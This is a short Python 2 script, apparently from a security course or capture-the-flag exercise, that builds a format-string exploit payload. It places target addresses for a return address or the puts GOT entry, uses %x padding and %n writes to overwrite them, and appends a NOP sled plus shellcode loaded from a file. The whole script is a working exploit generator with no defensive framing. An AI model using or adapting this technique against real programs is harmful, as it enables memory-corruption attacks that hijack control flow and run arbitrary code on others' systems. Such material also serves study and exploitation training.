import sys


# target address to be overwritten = 0xffffd5cc
# it's on the return from printf back to main

# the other option is to write over the puts command
# doing objdump -R on the program, we see the allocation at 08049790

qstr = ''
shellcode = ''

with open('inject1') as fp:
    shellcode = fp.read()

basenum = int('90',16)
for i in range(0,4):
    qstr += chr(basenum + i)
    qstr += '\x97\x04\x08'
    qstr += '____'


qstr += '%08x.' * 4

#new return address > 0xffffd640

qstr += '%' + str(0x140 -8*4 - (8+1)*4) + 'x%n'

#qstr += '%08x%n'

qstr += '%' + str(0xd6 - 0x40) + 'x%n'
qstr += '%' + str(0xff - 0xd6) + 'x%n'
qstr += '%' + str(0x1ff - 0xff) + 'x%n'


qstr += '\x90' * (150-len(qstr))
qstr += shellcode

print qstr
